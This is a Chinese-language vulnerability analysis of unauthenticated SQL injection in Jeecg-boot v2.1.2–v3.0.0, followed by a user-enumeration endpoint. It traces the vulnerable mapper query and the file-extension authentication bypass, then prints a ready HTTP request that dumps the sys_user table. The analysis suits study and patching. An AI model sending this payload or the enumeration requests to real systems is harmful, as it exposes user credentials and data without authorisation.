---
source: "gelusus/wxvl 公众号漏洞文库"
---

#  Jeecg-boot v2.1.2-v3.0.0 SQL注入漏洞+敏感接口分析  
原创 chobits02  C4安全   2025-07-21 06:21  
  
前言  
#### 短期攻防结束了，公司几个系统的漏洞就给到了开发的手里，仔细一看都是用相同开源框架二次开发而来的，版本都比较老了，都是基于Jeecg-boot二次开发  
#### 该系统在v2.1.2-v3.0.0版本中存在SQL注入漏洞，还有其他敏感接口，下面就分析看下  
#### Jeecg-boot是北京国炬信息技术有限公司开发的低代码开发框架  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJSRbB9By9wT89jdfDVtIGVycrdsFdBNMwuZWg7hibXCmMGPklHq9yicyG4W1kYDoAAAPpuHCQPMTXQQ/640?wx_fmt=png&from=appmsg "")  
#### 框架只是个后端Java框架，前端都是不一样的，唯一能判断的特征可能是系统自带的验证码接口，如下  
```
/api/sys/randomImage/一串数字
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJSRbB9By9wT89jdfDVtIGVylgTcQBo9ltRjJczK6v7Z9QicCWFGwIWGiaRb4X0XKE6ibj1r7USy7gaNA/640?wx_fmt=png&from=appmsg "")  
  
  
然后直接来到漏洞接口地址  
```
/api/sys/ng-alain/getDictItemsByTable
```  
  
方法位于  
NgAlainController当中  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJSRbB9By9wT89jdfDVtIGVyQtLE4Y1GWBNJ7nrEiaIDIibAbic3QvhLMlN3ceOAgWOqHh0q2S7TFCPHw/640?wx_fmt=png&from=appmsg "")  
```
@RequestMapping(value = "/getDictItemsByTable/{table}/{key}/{value}", method = RequestMethod.GET)
public Object getDictItemsByTable(@PathVariable String table,@PathVariable String key,@PathVariable String value) {    
  return this.ngAlainService.getDictByTable(table,key,value);
}
```  
  
然后根据service层追踪到mapper层  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJSRbB9By9wT89jdfDVtIGVyJyKPEnc8WShbxDL9cqgzYzeIUw1kxD4ZCga8x5ws5wqT62mjaCQwLw/640?wx_fmt=png&from=appmsg "")  
  
可以看到参数直接可以指定查询的数据库  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJSRbB9By9wT89jdfDVtIGVychp9ceM1UPdicSsFicdVKXG4LDaprRg8yEdiaJlPOBv0HR0Dpp9hywxmw/640?wx_fmt=png&from=appmsg "")  
```
@Select("select ${key} as \"label\",${value} as \"value\" from ${table}")
```  
  
这里key和value可以指定任意数据库的两个字段，然后table可以指定任意数据库  
  
不过直接请求这个接口是需要鉴权的，这就要提到接口放行的配置了  
  
  
可以注意到这个接口传参是以  
/getDictItemsByTable/{table}/{key}/{value}  
  
通过斜杠传参，而看系统放行配置，存在匹配任意URL，只要结尾是文件格式的即可放行  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJSRbB9By9wT89jdfDVtIGVysPc7qm0jml6zxbtbG1q2MibVVpWwLzXuAgUh0IdE7f68DfibJCPJJXow/640?wx_fmt=png&from=appmsg "")  
  
两者结合一下就能造成未授权的SQL注入漏洞了，一般都是查sys_user这个自带表  
```
GET /api/sys/ng-alain/getDictItemsByTable/'%20from%20sys_user/*,%20'/x.js HTTP/1.1
Host: 
sec-ch-ua: "Not A(Brand";v="8", "Chromium";v="132", "Google Chrome";v="132"
Sec-Fetch-Dest: empty
Accept: application/json, text/plain, */*
Sec-Fetch-Mode: cors
Accept-Language: zh-CN,zh;q=0.9
Sec-Fetch-Site: same-origin
Accept-Encoding: gzip, deflate, br, zstd
sec-ch-ua-platform: "Windows"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
sec-ch-ua-mobile: ?0
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJSRbB9By9wT89jdfDVtIGVy7YWCW3KZAIV4Ioib1wlobbekaqEoyzkTnSkjIu05Wp0CUAnV8MMCDrQ/640?wx_fmt=png&from=appmsg "")  
  
不过你懂得，这些密码是带盐值加密的MD5，逆向推出明文需要先生成数据库之后碰撞，而系统里面的密码是这么个加密逻辑：  
```
PasswordUtil.encrypt(username, password, salt);
```  
  
通过用户名、明文密码、盐值三者加密而来，所以一般想破解你还要下载框架自己加密一个字典，还挺麻烦的  
  
  
然后下面一个接口是  
/api/sys/user/checkOnlyUser  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJSRbB9By9wT89jdfDVtIGVyvicWyKKGP5xlIHlxa5CNiccMTp5rDTKOXsfdib1oYqjbahDSroATYNMBw/640?wx_fmt=png&from=appmsg "")  
  
同样无需鉴权，很简单用QueryWrapper查用户  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJSRbB9By9wT89jdfDVtIGVyL8xvEfjMB4UULYWjEmlVPQmf825nWicg2N7YF5SBFxVVVeCj2HFMfLw/640?wx_fmt=png&from=appmsg "")  
  
只要是SysUser里的字段，你都能查询是否有对应的用户有这个字段的值  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJSRbB9By9wT89jdfDVtIGVyxY4yKbheUXsHbOeUtqvmniaGEGULYatvzQvXbWVzcNlN6frBAPJPg3Q/640?wx_fmt=png&from=appmsg "")  
  
username、realname、password、salt、email等等，都能爆破是否存在  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJSRbB9By9wT89jdfDVtIGVyYo7qzDetWgVqGibRXXZMoz3vicPibXhInC0z6ticHDR2sJ2zgDTfFciaZXg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJSRbB9By9wT89jdfDVtIGVyZpFRZNks09rlnDicCbiat89W5vjXajSricRrbhUnhRQuLAsfx14EGeeQg/640?wx_fmt=png&from=appmsg "")  
  
但是用处不大  
  
  
结语  
  
感兴趣的可以公众号私聊我  
进团队交流群，  
咨询问题，hvv简历投递，nisp和cisp考证都可以联系我  
  
**内部src培训视频，内部知识圈，可私聊领取优惠券，加入链接：https://wiki.freebuf.com/societyDetail?society_id=184**  
  
**加入团队、加入公开群等都可联系微信：yukikhq，搜索添加即可。**  
  
****  
![图片](https://mmbiz.qpic.cn/mmbiz_gif/EXTCGqBpVJQSCTuiawtOw7G9JFaBeBc06sHdBhSTMMClOr5wLWmLYIl6Yry9n3ZIL97tylQib5YLOuJFxndeFMEg/640?wx_fmt=gif&from=appmsg&wxfrom=5&wx_lazy=1&tp=wxpic "")  
  
END  
  
  


---

> 来源：gelusus/wxvl（微信公众号漏洞文章自动归档，原文见文首链接）
